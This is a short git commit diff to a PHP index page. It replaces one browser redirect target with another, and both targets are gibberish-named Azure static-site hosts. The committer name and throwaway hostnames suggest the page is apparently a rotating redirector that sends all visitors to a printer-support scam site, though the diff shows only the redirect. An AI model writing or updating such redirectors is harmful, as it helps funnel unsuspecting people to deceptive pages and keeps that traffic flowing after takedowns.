cb2ed8ba4e962cd9cdd7b716b19e6709d3509fb9
repairprinters379 <repairprinters379@gmail.com>
2025-01-15 20:52:58 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://thanxx4helpiinnggsdxx.z13.web.core.windows.net/");
+header("Location: https://thxx4hav33code7821kjhxx.z13.web.core.windows.net/");
  
 exit;
 ?>
